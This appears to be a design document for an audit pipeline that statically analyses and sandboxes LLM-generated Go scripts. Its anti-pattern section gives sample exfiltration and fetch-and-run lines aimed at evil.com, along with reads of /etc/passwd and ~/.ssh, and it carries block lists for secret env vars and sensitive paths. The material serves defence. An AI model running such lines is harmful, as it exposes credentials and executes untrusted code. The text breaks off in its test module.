# Go Script Security Auditing Patterns

**Purpose:** Define the security audit pipeline for LLM-generated Go scripts in CruxBot's script library. This is the last gate before execution.
**Audience:** CruxBot implementors (Rust codebase calling Go tools and parsing output).
**Scope:** Static analysis, AST-based auditing, allowlisting, sandbox verification, anti-pattern detection.

---

## 1. Threat Model

LLM-generated Go scripts are untrusted code. The LLM may:

1. **Hallucinate dangerous patterns** -- importing packages that exfiltrate data, writing to system directories, spawning background processes.
2. **Be prompt-injected** -- adversarial input in issue titles, PR descriptions, or user content could instruct the LLM to generate malicious code.
3. **Produce subtly dangerous code** -- code that passes casual review but contains time-delayed execution, obfuscated payloads, or side-channel data leaks.
4. **Generate resource-exhausting code** -- infinite loops, unbounded allocations, goroutine leaks.

The audit pipeline must catch all four categories with zero false negatives on categories 1-3. False positives (rejecting safe code) are acceptable -- the LLM can regenerate.

---

## 2. Available Go Security Tools

### 2.1 `go vet` (built-in)

**What it does:** Detects suspicious constructs -- printf format mismatches, unreachable code, wrong struct tags, incorrect atomic operations, copying sync types.

**Security value:** Low direct security value, but catches code quality issues that indicate LLM hallucination. A script that fails `go vet` is likely malformed.

**Invocation from Rust:**
```rust
let output = Command::new("go")
    .args(["vet", "./..."])
    .current_dir(&sandbox_dir)
    .output()?;
// Exit code 0 = pass, non-zero = findings
// Findings on stderr, one per line: "file.go:line:col: message"
```

**Output format (stderr):**
```
main.go:15:2: printf call has arguments but no formatting directives
main.go:22:4: unreachable code
```

**Parse pattern:** `^(.+):(\d+):(\d+): (.+)$` -- file, line, col, message.

### 2.2 `staticcheck` (honnef.co/go/tools)

**What it does:** Advanced static analysis -- 150+ checks across correctness, performance, simplicity, and style. Superset of `go vet` in many areas.

**Security value:** Medium. Catches dead code, unused results (ignoring errors from security-critical operations), and deprecated API usage.

**Install:** `go install honnef.co/go/tools/cmd/staticcheck@latest`

**Invocation from Rust:**
```rust
let output = Command::new("staticcheck")
    .args(["./..."])
    .current_dir(&sandbox_dir)
    .output()?;
```

**Output format (stderr):**
```
main.go:10:2: SA1019: net/http.Get has been deprecated since Go 1.22
main.go:15:5: S1023: redundant break statement
```

**Parse pattern:** `^(.+):(\d+):(\d+): (SA\d+|S\d+|ST\d+|QF\d+): (.+)$`

**Relevant check categories for security:**
- `SA1019` -- deprecated APIs (often deprecated for security reasons)
- `SA4006` -- value assigned and never used (potential data handling errors)
- `SA5001` -- deferred close on writable file (resource leaks)

### 2.3 `gosec` (securego/gosec)

**What it does:** Go security checker. Scans Go AST for security problems using a rule set mapped to CWE identifiers.

**Security value:** High. Purpose-built for security. This is the primary third-party security tool.

**Install:** `go install github.com/securego/gosec/v2/cmd/gosec@latest`

**Invocation from Rust (JSON output for structured parsing):**
```rust
let output = Command::new("gosec")
    .args(["-fmt=json", "-quiet", "./..."])
    .current_dir(&sandbox_dir)
    .output()?;
```

**JSON output structure:**
```json
{
  "Golang errors": {},
  "Issues": [
    {
      "severity": "HIGH",
      "confidence": "HIGH",
      "cwe": { "id": "22", "url": "..." },
      "rule_id": "G304",
      "details": "Potential file inclusion via variable",
      "file": "/path/to/main.go",
      "line": "15",
      "column": "10",
      "code": "os.Open(userInput)"
    }
  ],
  "Stats": {
    "files": 1,
    "lines": 50,
    "nosec": 0,
    "found": 1
  }
}
```

**Critical gosec rules for LLM-generated scripts:**

| Rule | CWE | Description | Action |
|------|-----|-------------|--------|
| G101 | CWE-798 | Hardcoded credentials | REJECT |
| G102 | CWE-200 | Binding to all interfaces | REJECT |
| G104 | CWE-703 | Unhandled errors | WARN |
| G107 | CWE-88 | URL provided to HTTP request as taint input | REJECT |
| G110 | CWE-409 | Decompression bomb | REJECT |
| G201-G203 | CWE-89 | SQL injection patterns | REJECT |
| G204 | CWE-78 | Subprocess launched with variable | REJECT |
| G301-G307 | CWE-276/22 | File permission / path issues | REJECT |
| G401-G407 | Various | Weak crypto (DES, MD5, RC4, hardcoded nonce) | REJECT |
| G501-G505 | CWE-295 | TLS/crypto misconfig (import blocklist) | REJECT |
| G601 | CWE-118 | Implicit memory aliasing in for loop | WARN |

**Gate rule:** Any finding with severity HIGH must cause rejection. No `//nosec` annotations allowed (strip them before audit).

### 2.4 `govulncheck` (golang.org/x/vuln)

**What it does:** Checks dependencies against the Go vulnerability database. Reports only vulnerabilities that are actually reachable in the call graph.

**Security value:** High for scripts with external dependencies. Lower for scripts using only stdlib, but still catches stdlib CVEs.

**Install:** `go install golang.org/x/vuln/cmd/govulncheck@latest`

**Invocation from Rust (JSON output):**
```rust
let output = Command::new("govulncheck")
    .args(["-json", "./..."])
    .current_dir(&sandbox_dir)
    .output()?;
```

**JSON output structure (stream of JSON objects):**
```json
{"finding":{"osv":"GO-2024-2687","trace":[{"module":"stdlib","version":"go1.22.1","package":"net/http"}]}}
```

**Gate rule:** Any finding = rejection. LLM must regenerate with patched dependency versions.

---

## 3. Custom AST-Based Audit (The Core Gate)

The third-party tools above catch known vulnerability patterns. The custom AST audit catches **LLM-specific** threats: import violations, path escapes, data exfiltration, and resource abuse. This is implemented as a Go program that CruxBot compiles once and invokes per script.

### 3.1 Architecture

```
cruxbot (Rust) --> calls --> crux-go-audit (Go binary)
                              |
                              +--> go/parser.ParseFile()
                              +--> go/ast.Inspect()
                              +--> checks against policy
                              +--> JSON verdict on stdout
```

The audit tool is a standalone Go binary because Go's `go/ast` package is the canonical, always-correct parser. Reimplementing Go parsing in Rust would be fragile and lag behind language changes.

### 3.2 Import Allowlist

The most important check. LLM scripts must only import approved packages.

**Tier 1: Always Allowed (pure computation)**
```
fmt
strings
strconv
unicode
unicode/utf8
sort
slices
maps
math
math/big
bytes
errors
log
io
bufio
regexp
time
encoding/json
encoding/csv
encoding/xml
encoding/hex
encoding/base64
path
path/filepath
text/template
html/template
```

**Tier 2: Allowed With Constraints (I/O operations)**
```
os              -- file ops only, constrained to workspace (see 3.3)
os/signal       -- only for graceful shutdown
io/fs           -- read-only filesystem operations
```

**Tier 3: Allowed Per Script Category**
```
net/http        -- only for "http-client" category scripts
net/url         -- only with net/http
crypto/*        -- only for "crypto" category scripts
database/sql    -- only for "database" category scripts
```

**Tier 4: Always Blocked**
```
os/exec         -- process execution (CWE-78)
syscall         -- direct syscalls (CWE-250)
unsafe          -- memory safety bypass
reflect         -- runtime type manipulation (obfuscation vector)
plugin          -- dynamic loading (CWE-502)
net             -- raw sockets (use net/http if needed)
runtime/debug   -- stack/memory inspection
debug/*         -- debugger interfaces
C (cgo)         -- foreign function interface
internal/*      -- Go internal packages
```

**AST check implementation:**
```go
func checkImports(file *ast.File, policy *Policy) []Finding {
    var findings []Finding
    for _, imp := range file.Imports {
        path := strings.Trim(imp.Path.Value, `"`)
        if policy.IsBlocked(path) {
            findings = append(findings, Finding{
                Severity: "CRITICAL",
                Rule:     "IMPORT_BLOCKED",
                Message:  fmt.Sprintf("blocked import: %s", path),
                Line:     fset.Position(imp.Pos()).Line,
            })
        } else if !policy.IsAllowed(path, scriptCategory) {
            findings = append(findings, Finding{
                Severity: "HIGH",
                Rule:     "IMPORT_NOT_ALLOWED",
                Message:  fmt.Sprintf("import not in allowlist for category %q: %s", scriptCategory, path),
                Line:     fset.Position(imp.Pos()).Line,
            })
        }
    }
    return findings
}
```

### 3.3 File Path Confinement

All file operations must use paths rooted in the provided workspace directory. The audit checks:

1. **No absolute paths** -- string literals starting with `/` in file operation contexts.
2. **No parent traversal** -- `..` in any path string literal or path.Join argument.
3. **No sensitive directories** -- `.ssh`, `.aws`, `.config`, `.gnupg`, `/etc`, `/usr`, `/tmp` (outside sandbox tmp).
4. **No symlink following** -- `os.Readlink`, `filepath.EvalSymlinks` flagged unless the script explicitly validates the resolved path stays within workspace.

**AST check: detect file operations with suspicious arguments**
```go
func checkFileOps(node ast.Node, fset *token.FileSet) []Finding {
    var findings []Finding
    ast.Inspect(node, func(n ast.Node) bool {
        call, ok := n.(*ast.CallExpr)
        if !ok {
            return true
        }
        sel, ok := call.Fun.(*ast.SelectorExpr)
        if !ok {
            return true
        }

        // Check os.Open, os.Create, os.ReadFile, os.WriteFile, etc.
        pkg := exprToString(sel.X)
        fn := sel.Sel.Name
        if isFileOp(pkg, fn) {
            for _, arg := range call.Args {
                if lit, ok := arg.(*ast.BasicLit); ok && lit.Kind == token.STRING {
                    val := strings.Trim(lit.Value, `"` + "`")
                    if strings.HasPrefix(val, "/") {
                        findings = append(findings, pathFinding("absolute path in file operation", lit, fset))
                    }
                    if strings.Contains(val, "..") {
                        findings = append(findings, pathFinding("parent traversal in file operation", lit, fset))
                    }
                    if containsSensitivePath(val) {
                        findings = append(findings, pathFinding("sensitive directory access", lit, fset))
                    }
                }
            }
        }
        return true
    })
    return findings
}

var sensitivePathPatterns = []string{
    ".ssh", ".aws", ".config", ".gnupg", ".kube",
    "/etc/", "/usr/", "/var/", "/root/",
    "/proc/", "/sys/", "/dev/",
}

var fileOpFunctions = map[string][]string{
    "os":      {"Open", "Create", "ReadFile", "WriteFile", "Remove", "RemoveAll",
                "Mkdir", "MkdirAll", "OpenFile", "Rename", "Stat", "Lstat",
                "ReadDir", "Chmod", "Chown", "Link", "Symlink"},
    "io":      {"ReadAll"},
    "bufio":   {"NewReader", "NewWriter", "NewScanner"},
    "filepath":{"Walk", "WalkDir", "Glob"},
}
```

### 3.4 Network Access Controls

For scripts in the "http-client" category that are allowed `net/http`:

1. **URL allowlist** -- all HTTP requests must use URLs from a predefined host allowlist.
2. **No dynamic URL construction from env vars** -- `os.Getenv` result flowing into `http.Get` is a data exfiltration vector.
3. **No POST/PUT to unknown hosts** -- only GET to allowed hosts unless script category is "http-writer".
4. **No raw `net.Dial`** -- always blocked; `net/http` is the only allowed network package.

**AST check: detect HTTP calls and validate URL arguments**
```go
func checkNetworkCalls(node ast.Node, allowedHosts []string) []Finding {
    var findings []Finding
    ast.Inspect(node, func(n ast.Node) bool {
        call, ok := n.(*ast.CallExpr)
        if !ok {
            return true
        }

        // Detect http.Get, http.Post, http.NewRequest, client.Do, etc.
        if isHTTPCall(call) {
            urlArg := extractURLArg(call)
            if urlArg == nil {
                // URL constructed dynamically -- flag it
                findings = append(findings, Finding{
                    Severity: "HIGH",
                    Rule:     "DYNAMIC_URL",
                    Message:  "HTTP call with non-literal URL requires manual review",
                })
                return true
            }
            host := extractHost(urlArg)
            if !isAllowedHost(host, allowedHosts) {
                findings = append(findings, Finding{
                    Severity: "CRITICAL",
                    Rule:     "DISALLOWED_HOST",
                    Message:  fmt.Sprintf("HTTP call to disallowed host: %s", host),
                })
            }
        }
        return true
    })
    return findings
}
```

### 3.5 Environment Variable Access

`os.Getenv` and `os.LookupEnv` can leak credentials. The audit enforces:

1. **Allowlist of readable env vars** -- `HOME`, `PATH`, `GOPATH`, `GOROOT`, `USER`, `LANG`, `TZ`, and any project-specific vars declared in the script manifest.
2. **Block sensitive env var names** -- anything matching patterns: `*KEY*`, `*SECRET*`, `*TOKEN*`, `*PASSWORD*`, `*CREDENTIAL*`, `*AUTH*`, `*API_KEY*`, `AWS_*`, `GITHUB_*`, `ANTHROPIC_*`.
3. **No `os.Environ()`** -- dumps all environment variables; always blocked.

```go
var blockedEnvPatterns = []string{
    "KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "AUTH",
    "API_KEY", "AWS_", "GITHUB_", "ANTHROPIC_", "OPENAI_",
    "DATABASE_URL", "REDIS_URL", "PRIVATE",
}

func checkEnvAccess(node ast.Node) []Finding {
    // Find all os.Getenv("...") and os.LookupEnv("...") calls
    // If argument is a string literal, check against allowlist
    // If argument is dynamic (variable), flag as HIGH
    // Flag os.Environ() as CRITICAL
}
```

### 3.6 Goroutine and Resource Abuse Detection

LLM-generated code should not:

1. **Spawn goroutines** -- unless the script category is "concurrent". Goroutines that outlive `main()` can perform background actions after the script appears to have finished.
2. **Use `select {}` or `time.Sleep` for indefinite blocking** -- denial of service.
3. **Allocate unbounded slices/maps** -- `make([]byte, userInput)` is a memory bomb.
4. **Use `init()` functions** -- code that runs before `main()` is a hiding place.
5. **Use `defer` with side effects in `main()`** -- deferred actions execute after the apparent return, allowing hidden behavior.

```go
func checkResourceAbuse(file *ast.File) []Finding {
    var findings []Finding

    // Check for init() functions
    for _, decl := range file.Decls {
        if fn, ok := decl.(*ast.FuncDecl); ok {
            if fn.Name.Name == "init" {
                findings = append(findings, Finding{
                    Severity: "HIGH",
                    Rule:     "INIT_FUNCTION",
                    Message:  "init() functions are not allowed -- all logic must be in main()",
                })
            }
        }
    }

    ast.Inspect(file, func(n ast.Node) bool {
        switch stmt := n.(type) {
        case *ast.GoStmt:
            findings = append(findings, Finding{
                Severity: "HIGH",
                Rule:     "GOROUTINE",
                Message:  "goroutine spawning requires 'concurrent' script category",
            })
        case *ast.ForStmt:
            // Flag infinite loops: for { ... } with no condition
            if stmt.Cond == nil && stmt.Init == nil && stmt.Post == nil {
                findings = append(findings, Finding{
                    Severity: "MEDIUM",
                    Rule:     "INFINITE_LOOP",
                    Message:  "bare for loop (infinite) -- ensure timeout mechanism exists",
                })
            }
        }
        return true
    })
    return findings
}
```

### 3.7 Obfuscation and Evasion Detection

LLM-generated code has no legitimate reason to use obfuscation. Flag:

1. **`base64.StdEncoding.DecodeString` followed by execution-like patterns** -- decoding a payload at runtime.
2. **`hex.DecodeString` with long literals** -- embedded binary payloads.
3. **String concatenation building known-dangerous identifiers** -- `"os" + "/exec"` to bypass import checks.
4. **`//go:linkname` directive** -- accesses unexported symbols; bypass mechanism.
5. **`//go:generate` directive** -- runs arbitrary commands at build time.
6. **Build tags that conditionally include code** -- `//go:build ignore` or `// +build !audit`.
7. **Large string literals (> 1KB)** -- potential encoded payloads.
8. **Backtick (raw) strings containing shell commands** -- template injection.

```go
func checkObfuscation(file *ast.File, src []byte) []Finding {
    var findings []Finding

    // Check for go:linkname and go:generate directives in comments
    for _, cg := range file.Comments {
        for _, c := range cg.List {
            text := c.Text
            if strings.Contains(text, "go:linkname") {
                findings = append(findings, directiveFinding("go:linkname", c))
            }
            if strings.Contains(text, "go:generate") {
                findings = append(findings, directiveFinding("go:generate", c))
            }
            if strings.Contains(text, "nosec") {
                findings = append(findings, directiveFinding("nosec annotation (gosec bypass)", c))
            }
        }
    }

    // Check for large string literals
    ast.Inspect(file, func(n ast.Node) bool {
        if lit, ok := n.(*ast.BasicLit); ok && lit.Kind == token.STRING {
            val := lit.Value
            if len(val) > 1024 {
                findings = append(findings, Finding{
                    Severity: "MEDIUM",
                    Rule:     "LARGE_STRING_LITERAL",
                    Message:  fmt.Sprintf("string literal of %d bytes -- verify not an encoded payload", len(val)),
                })
            }
        }
        return true
    })

    return findings
}
```

### 3.8 Audit Output Format

The `crux-go-audit` binary outputs a JSON verdict:

```json
{
  "verdict": "REJECT",
  "findings": [
    {
      "severity": "CRITICAL",
      "rule": "IMPORT_BLOCKED",
      "message": "blocked import: os/exec",
      "file": "main.go",
      "line": 5,
      "column": 2
    },
    {
      "severity": "HIGH",
      "rule": "GOROUTINE",
      "message": "goroutine spawning requires 'concurrent' script category",
      "file": "main.go",
      "line": 22,
      "column": 3
    }
  ],
  "stats": {
    "imports_checked": 8,
    "file_ops_checked": 3,
    "network_calls_checked": 0,
    "env_accesses_checked": 1,
    "goroutines_found": 1,
    "lines_of_code": 45
  }
}
```

**Verdict rules:**
- Any CRITICAL finding --> `REJECT`
- Any HIGH finding --> `REJECT`
- MEDIUM findings only --> `PASS_WITH_WARNINGS` (logged but allowed)
- No findings --> `PASS`

---

## 4. Sandbox Verification (Post-Compilation)

After the script passes all static analysis and compiles successfully, verify the binary itself.

### 4.1 Binary Size Check

LLM-generated scripts should be small. A Go binary for a utility script is typically 2-10MB (Go statically links the runtime). Anything larger indicates embedded payloads or excessive dependencies.

```rust
const MAX_BINARY_SIZE: u64 = 50 * 1024 * 1024; // 50MB

fn check_binary_size(binary_path: &Path) -> Result<(), AuditError> {
    let metadata = std::fs::metadata(binary_path)?;
    if metadata.len() > MAX_BINARY_SIZE {
        return Err(AuditError::BinarySizeExceeded {
            actual: metadata.len(),
            max: MAX_BINARY_SIZE,
        });
    }
    Ok(())
}
```

### 4.2 Static Linking Verification

The binary should be statically linked (Go default, but cgo can introduce dynamic deps).

```rust
// macOS: check for dynamic libraries
fn verify_static_linking(binary_path: &Path) -> Result<(), AuditError> {
    let output = Command::new("otool")
        .args(["-L", binary_path.to_str().unwrap()])
        .output()?;
    let libs = String::from_utf8_lossy(&output.stdout);
    // Go static binaries on macOS show only the binary itself
    // If it lists dylibs like libSystem.B.dylib, it used cgo
    if libs.lines().count() > 2 {
        return Err(AuditError::DynamicLinking {
            libraries: libs.to_string(),
        });
    }
    Ok(())
}

// Linux: use ldd
fn verify_static_linking_linux(binary_path: &Path) -> Result<(), AuditError> {
    let output = Command::new("ldd")
        .args([binary_path.to_str().unwrap()])
        .output()?;
    let out = String::from_utf8_lossy(&output.stdout);
    if !out.contains("not a dynamic executable") && !out.contains("statically linked") {
        return Err(AuditError::DynamicLinking {
            libraries: out.to_string(),
        });
    }
    Ok(())
}
```

### 4.3 Symbol Table Inspection

Check the binary's symbol table for suspicious function references that might have been missed by source analysis (e.g., through `//go:linkname`).

```rust
fn check_symbols(binary_path: &Path) -> Result<(), AuditError> {
    let output = Command::new("go")
        .args(["tool", "nm", binary_path.to_str().unwrap()])
        .output()?;
    let symbols = String::from_utf8_lossy(&output.stdout);

    let blocked_symbols = [
        "os/exec", "syscall.Exec", "syscall.RawSyscall",
        "net.(*netFD)", "plugin.Open",
    ];

    for sym in blocked_symbols {
        if symbols.contains(sym) {
            return Err(AuditError::BlockedSymbol {
                symbol: sym.to_string(),
            });
        }
    }
    Ok(())
}
```

---

## 5. Runtime Execution Controls

Even after all static checks pass, runtime isolation limits blast radius.

### 5.1 Timeout Enforcement

```rust
use std::time::Duration;
use std::process::Command;

const SCRIPT_TIMEOUT: Duration = Duration::from_secs(300); // 5 minutes

fn execute_script(binary_path: &Path, workspace: &Path) -> Result<Output, ExecutionError> {
    let child = Command::new(binary_path)
        .current_dir(workspace)
        .env_clear()  // Start with empty environment
        .env("HOME", workspace)
        .env("PATH", "/usr/local/go/bin:/usr/bin:/bin")
        .env("TMPDIR", workspace.join(".tmp"))
        .stdout(Stdio::piped())
        .stderr(Stdio::piped())
        .spawn()?;

    match child.wait_timeout(SCRIPT_TIMEOUT)? {
        Some(status) => Ok(Output { status, ... }),
        None => {
            child.kill()?;  // SIGKILL
            Err(ExecutionError::Timeout {
                limit: SCRIPT_TIMEOUT,
            })
        }
    }
}
```

### 5.2 Resource Limits (Linux)

On Linux, use `setrlimit` via the `rlimit` crate before exec:

```rust
use rlimit::{setrlimit, Resource};

fn set_resource_limits() -> Result<(), std::io::Error> {
    // Memory: 512MB max
    setrlimit(Resource::AS, 512 * 1024 * 1024, 512 * 1024 * 1024)?;
    // File descriptors: 64 max
    setrlimit(Resource::NOFILE, 64, 64)?;
    // CPU time: 300 seconds
    setrlimit(Resource::CPU, 300, 300)?;
    // No core dumps
    setrlimit(Resource::CORE, 0, 0)?;
    // Max file size: 100MB
    setrlimit(Resource::FSIZE, 100 * 1024 * 1024, 100 * 1024 * 1024)?;
    // Max processes (prevent fork bombs): 1 (no child processes)
    setrlimit(Resource::NPROC, 1, 1)?;
    Ok(())
}
```

### 5.3 macOS Sandbox Profile (Apple Seatbelt)

On macOS, use `sandbox-exec` with a restrictive profile:

```
(version 1)
(deny default)
(allow file-read* (subpath "/usr/local/go"))
(allow file-read* (subpath "${WORKSPACE}"))
(allow file-write* (subpath "${WORKSPACE}"))
(allow file-read-data (literal "/dev/urandom"))
(allow process-exec (literal "${BINARY_PATH}"))
(deny network*)
(deny process-fork)
(deny sysctl*)
(deny system-socket)
```

Note: `sandbox-exec` is deprecated but still functional on macOS as of macOS 15. For long-term, consider using the Endpoint Security framework or running in a container.

### 5.4 Environment Sanitization

Never pass the host environment to the script. Build a minimal environment:

```rust
fn build_script_env(workspace: &Path, script_config: &ScriptConfig) -> Vec<(String, String)> {
    let mut env = vec![
        ("HOME".into(), workspace.to_string_lossy().into()),
        ("PATH".into(), "/usr/local/go/bin:/usr/bin:/bin".into()),
        ("TMPDIR".into(), workspace.join(".tmp").to_string_lossy().into()),
        ("LANG".into(), "en_US.UTF-8".into()),
        ("TZ".into(), "UTC".into()),
    ];

    // Add only explicitly declared env vars from script manifest
    for (key, value) in &script_config.env_vars {
        if !is_sensitive_env_key(key) {
            env.push((key.clone(), value.clone()));
        }
    }

    env
}
```

---

## 6. The Complete Audit Pipeline

```
LLM returns Go source code
         |
         v
[Step 0] Strip nosec/nolint annotations
         |
         v
[Step 1] go vet ./...
         |-- FAIL --> REJECT (malformed code)
         v
[Step 2] gosec -fmt=json -quiet ./...
         |-- Any HIGH/CRITICAL --> REJECT
         v
[Step 3] crux-go-audit (custom AST audit)
         |-- Import allowlist check
         |-- File path confinement check
         |-- Network access check
         |-- Env var access check
         |-- Goroutine/resource abuse check
         |-- Obfuscation/evasion check
         |-- Any HIGH/CRITICAL --> REJECT
         v
[Step 4] go test ./...
         |-- FAIL --> REJECT (tests don't pass)
         v
[Step 5] CGO_ENABLED=0 go build -o script ./...
         |-- FAIL --> REJECT (doesn't compile)
         v
[Step 6] Binary verification
         |-- Size check (< 50MB)
         |-- Static linking check
         |-- Symbol table check
         |-- Any failure --> REJECT
         v
[Step 7] Register script in library
         |
         v
[Step 8] Execute with runtime controls
         |-- env_clear + minimal env
         |-- timeout (SIGKILL after 5 min)
         |-- resource limits (rlimit)
         |-- sandbox profile (macOS/Linux)
         |-- capture stdout/stderr
         v
       RESULT
```

### Pipeline Implementation in Rust

```rust
pub struct AuditPipeline {
    sandbox_dir: PathBuf,
    workspace_dir: PathBuf,
    policy: SecurityPolicy,
}

#[derive(Debug)]
pub enum AuditResult {
    Pass { warnings: Vec<Finding> },
    Reject { reason: String, findings: Vec<Finding> },
}

impl AuditPipeline {
    pub fn audit(&self, source: &str, category: &str) -> Result<AuditResult, AuditError> {
        // Step 0: Strip nosec annotations
        let clean_source = strip_bypass_annotations(source);
        std::fs::write(self.sandbox_dir.join("main.go"), &clean_source)?;

        // Step 1: go vet
        let vet = self.run_go_vet()?;
        if !vet.status.success() {
            return Ok(AuditResult::Reject {
                reason: "go vet failed".into(),
                findings: parse_vet_output(&vet.stderr),
            });
        }

        // Step 2: gosec
        let gosec = self.run_gosec()?;
        let gosec_findings = parse_gosec_json(&gosec.stdout)?;
        if gosec_findings.iter().any(|f| f.severity == "HIGH" || f.severity == "CRITICAL") {
            return Ok(AuditResult::Reject {
                reason: "gosec found high-severity issues".into(),
                findings: gosec_findings,
            });
        }

        // Step 3: Custom AST audit
        let ast_audit = self.run_crux_go_audit(category)?;
        let ast_result: AuditVerdict = serde_json::from_slice(&ast_audit.stdout)?;
        if ast_result.verdict == "REJECT" {
            return Ok(AuditResult::Reject {
                reason: "custom AST audit failed".into(),
                findings: ast_result.findings,
            });
        }

        // Step 4: go test
        let test = self.run_go_test()?;
        if !test.status.success() {
            return Ok(AuditResult::Reject {
                reason: "tests failed".into(),
                findings: vec![],
            });
        }

        // Step 5: go build (static, no cgo)
        let build = self.run_go_build()?;
        if !build.status.success() {
            return Ok(AuditResult::Reject {
                reason: "build failed".into(),
                findings: vec![],
            });
        }

        // Step 6: Binary verification
        let binary = self.sandbox_dir.join("script");
        check_binary_size(&binary)?;
        verify_static_linking(&binary)?;
        check_symbols(&binary)?;

        // All checks passed
        let mut all_warnings = vec![];
        all_warnings.extend(gosec_findings.into_iter().filter(|f| f.severity == "MEDIUM"));
        all_warnings.extend(ast_result.findings.into_iter().filter(|f| f.severity == "MEDIUM"));

        Ok(AuditResult::Pass { warnings: all_warnings })
    }
}

fn strip_bypass_annotations(source: &str) -> String {
    source
        .lines()
        .map(|line| {
            // Remove //nosec, //nolint, and #nosec annotations
            let cleaned = line
                .replace("//nosec", "")
                .replace("// nosec", "")
                .replace("//nolint", "")
                .replace("// nolint", "")
                .replace("#nosec", "");
            cleaned
        })
        .collect::<Vec<_>>()
        .join("\n")
}
```

---

## 7. Anti-Patterns Reference

Comprehensive list of patterns the audit pipeline must detect:

### 7.1 File System Escape

```go
// BLOCKED: absolute path
os.ReadFile("/etc/passwd")

// BLOCKED: parent traversal
os.Open(filepath.Join(workspace, "..", "..", "etc", "passwd"))

// BLOCKED: sensitive directory
os.ReadDir(os.Getenv("HOME") + "/.ssh")

// BLOCKED: symlink escape (create symlink pointing outside workspace)
os.Symlink("/etc/passwd", filepath.Join(workspace, "link"))
data, _ := os.ReadFile(filepath.Join(workspace, "link"))
```

### 7.2 Data Exfiltration

```go
// BLOCKED: read sensitive file, POST to external server
data, _ := os.ReadFile(filepath.Join(workspace, "credentials.json"))
http.Post("https://evil.com/collect", "application/json", bytes.NewReader(data))

// BLOCKED: env var to HTTP
token := os.Getenv("GITHUB_TOKEN")
http.Get("https://evil.com/steal?token=" + token)

// BLOCKED: DNS exfiltration (encode data in DNS query)
net.LookupHost(base64.StdEncoding.EncodeToString(data) + ".evil.com")
```

### 7.3 Code Execution

```go
// BLOCKED: os/exec
exec.Command("bash", "-c", "curl evil.com | sh").Run()

// BLOCKED: syscall
syscall.Exec("/bin/sh", []string{"sh", "-c", "malicious"}, nil)

// BLOCKED: plugin loading
p, _ := plugin.Open("malicious.so")
```

### 7.4 Persistence and Stealth

```go
// BLOCKED: goroutine that outlives main
go func() {
    time.Sleep(10 * time.Minute)
    // do something malicious after apparent completion
}()

// BLOCKED: init() function hiding setup code
func init() {
    // runs before main, may not be noticed in review
    go exfiltrateData()
}

// BLOCKED: deferred action in main
func main() {
    defer func() {
        // executes after main returns, could hide behavior
        http.Post("https://evil.com", "", nil)
    }()
    // ... normal-looking code ...
}
```

### 7.5 Obfuscation

```go
// BLOCKED: base64-encoded payload execution
payload, _ := base64.StdEncoding.DecodeString("aW1wb3J0ICJvcy9leGVjIg==")
// ... use payload somehow

// BLOCKED: string concatenation to build import path
pkg := "os" + "/" + "exec"  // This won't bypass import checks, but flag the pattern

// BLOCKED: go:linkname to access unexported functions
//go:linkname runtimeExec runtime.exec
func runtimeExec(cmd string)

// BLOCKED: go:generate to run commands at build time
//go:generate curl https://evil.com/payload.sh | sh

// BLOCKED: build tag to conditionally include code
//go:build !audit
```

### 7.6 Resource Exhaustion

```go
// FLAGGED: unbounded allocation
data := make([]byte, size) // where size is from user input

// FLAGGED: infinite loop without timeout
for {
    // busy loop consuming CPU
}

// FLAGGED: goroutine leak
for i := 0; i < 1000000; i++ {
    go func() { select {} }()
}
```

---

## 8. Security Policy Configuration

The audit pipeline reads its policy from a TOML configuration:

```toml
[security]
max_binary_size_mb = 50
script_timeout_seconds = 300
max_memory_mb = 512
max_file_descriptors = 64
max_file_size_mb = 100
allow_goroutines = false
allow_init_functions = false

[imports.always_allowed]
packages = [
    "fmt", "strings", "strconv", "unicode", "sort", "slices", "maps",
    "math", "math/big", "bytes", "errors", "log", "io", "bufio",
    "regexp", "time", "encoding/json", "encoding/csv", "encoding/xml",
    "encoding/hex", "encoding/base64", "path", "path/filepath",
    "text/template", "html/template",
]

[imports.always_blocked]
packages = [
    "os/exec", "syscall", "unsafe", "reflect", "plugin", "net",
    "runtime/debug", "debug/dwarf", "debug/elf", "debug/gosym",
    "debug/macho", "debug/pe", "debug/plan9obj", "debug/buildinfo",
    "C",
]

[imports.category_allowed.http_client]
packages = ["net/http", "net/url", "crypto/tls"]

[imports.category_allowed.database]
packages = ["database/sql"]

[imports.category_allowed.crypto]
packages = ["crypto/sha256", "crypto/sha512", "crypto/hmac", "crypto/rand"]

[env.allowed]
vars = ["HOME", "PATH", "GOPATH", "GOROOT", "USER", "LANG", "TZ"]

[env.blocked_patterns]
patterns = [
    "KEY", "SECRET", "TOKEN", "PASSWORD", "CREDENTIAL", "AUTH",
    "API_KEY", "AWS_", "GITHUB_", "ANTHROPIC_", "OPENAI_",
    "DATABASE_URL", "REDIS_URL", "PRIVATE",
]

[network.allowed_hosts]
hosts = []  # Populated per script manifest

[filesystem.blocked_paths]
patterns = [
    ".ssh", ".aws", ".config", ".gnupg", ".kube",
    "/etc/", "/usr/", "/var/", "/root/", "/proc/", "/sys/", "/dev/",
]
```

---

## 9. Failure Modes and Recovery

| Failure | Action | Recovery |
|---------|--------|----------|
| Tool not installed (gosec, govulncheck) | Pipeline aborts with clear error | CruxBot installs missing tools automatically |
| Tool crashes | Treat as REJECT (fail-closed) | Log crash, retry once, then REJECT permanently |
| AST parse error | REJECT (malformed Go code) | LLM regenerates |
| Timeout during audit (tool hangs) | Kill tool process, REJECT | Log occurrence, check for adversarial code patterns |
| All steps pass but script fails at runtime | Capture error output, log, retry | Feed error back to LLM for regeneration |
| Script passes audit but behaves maliciously | Runtime controls limit damage | Post-mortem: add new AST check rule for the pattern |

**Fail-closed principle:** Any unexpected state in the audit pipeline results in REJECT. The only path to execution is every step explicitly passing.

---

## 10. Implementation Priority

1. **Phase 1 (MVP):** Import allowlist check via `crux-go-audit`. This single check blocks the majority of dangerous patterns by preventing access to dangerous packages. Plus `go vet` and `go build`.

2. **Phase 2:** Add `gosec` integration with JSON parsing. Add file path confinement and env var checks to `crux-go-audit`.

3. **Phase 3:** Add network access controls, goroutine detection, obfuscation detection. Add `govulncheck`. Binary verification (size, static linking, symbol table).

4. **Phase 4:** Add runtime sandboxing (macOS Seatbelt, Linux seccomp/Landlock). Add `staticcheck`. Full resource limits.

Each phase independently improves security. Phase 1 alone prevents the majority of attack vectors.

---

## 11. Testing the Audit Pipeline

The audit pipeline itself must have comprehensive tests:

```rust
#[cfg(test)]
mod tests {
    // Test: blocked import is rejected
    // Test: allowed import passes
    // Test: absolute path in file op is rejected
    // Test: parent traversal is rejected
    // Test: sensitive directory access is rejected
